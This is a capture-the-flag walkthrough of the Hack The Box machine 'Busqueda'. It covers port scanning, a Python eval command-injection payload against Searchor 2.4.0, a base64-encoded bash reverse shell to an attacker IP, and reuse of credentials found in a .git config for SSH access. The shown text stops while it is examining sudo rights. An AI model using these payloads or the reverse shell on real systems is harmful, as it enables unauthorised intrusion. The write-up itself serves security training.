# Busqueda
## STEPS:

> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.11.208 --min-rate 1000 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-24 06:54 PDT
Nmap scan report for 10.10.11.208
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.75 seconds
```

1. Based from the result, we know the host is running a web application in Apache version 2.4.52.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/526c63f9-847f-47ed-bd77-601505d93479)


2. Looking at the footer, we know the webapp using Flask and searchor version 2.4.0 (which is outdated) and there are many documentation out there.
3. Telling that this version is vulnerable to **command injection**.

> Documenations

```
https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-
https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
```

4. Reading one of the github, it seems the vuln is at:

> The blocked

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1a5046fd-3c43-4817-9098-589e27c710e5)


5. There's a eval usage, which allows us to inject bash command. But we can't just send --> `__import__('os').system('id')`, after tested the feature in normal way, seems we need to add `'` and wrap the python code with `str()`.

> TESTING NORMAL WAY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/677c944e-abcb-4b1a-ae32-60ecc1d11f0c)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/651bc11c-53be-4a88-b50d-367ad49224d4)


> OUR PAYLOAD

```py
') + str(__import__('os').system('id')) #
```

6. What it will look like:

```py
url = eval(Engine.<some_engine>.search('') + str(__import__('os').system('id')) #', copy_url={copy}, open_web={open})")
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/60c5b8bd-f160-4eb2-a9b9-b206961c9dc4)

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/322d7a72-6ea5-414e-97de-030dedb402e3)


7. Long story short, I got the user.txt inside the /home/svc directory.

```
') + str(__import__('os').system('cd .. && cd .. && cd .. && cd home && cd svc && cat user.txt && ls -a')) #
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ce1079fb-52db-4f00-a420-1661b7804100)


## USER FLAG

```
d8ad3edaacebd00c00e4b7c6fbdfbb77
```


8. To get the root flag, we need to do reverse shell first. I used this bash script template:

```sh
bash -i >& /dev/tcp/10.10.14.25/1337 0>&1
```

9. So our payload shall look like this:

```py
') + str(__import__('os').system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS8xMzM3IDA+JjE=|base64 -d|bash')) #
```

10. Now set a listener at port 1337 and send the payload.

> RESULT - GOT SHELL

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ca6c8071-116a-4c3e-88e0-6cf31dc86e88)


11. Well, when traversing to find the user.txt before, I found a .git directory which has a cred at the config file. Also it referencing to gitea.searcher.htb site.

```
svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
svc@busqueda:/var/www/app/.git$ 
```

> gitea.searcher.htb -> use -> cody:jh1usoih2bkjaspwe92

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1871d832-3231-4080-8722-511ebd99bed1)



#### NOTES:

```
In short about Gitea:
-> Similar to GitHub or GitLab but more lightweight, easy to install, and consume fewer system resources.
```


12. Nothing interesting here. Anyway i tried to run `sudo -l` to see the sudo permissions for user svc, but resulting to this:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f7be4e1d-0be1-42ac-8501-5dc4458848c6)


13. To solve this, we need to do login ssh using this cred --> `svc:jh1usoih2bkjaspwe92`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d4cb6819-21de-4b38-98b2-46a98be39809)


14. `/usr/bin/python3 /opt/scripts/system-checkup.py` can be our interest now.

> User only has access to execute.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8499175f-8203-485d-8286-09d3d58b20b2)


15. Things getting more interesting here.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dbf058b9-1555-4074-b24d-749de0a01249)








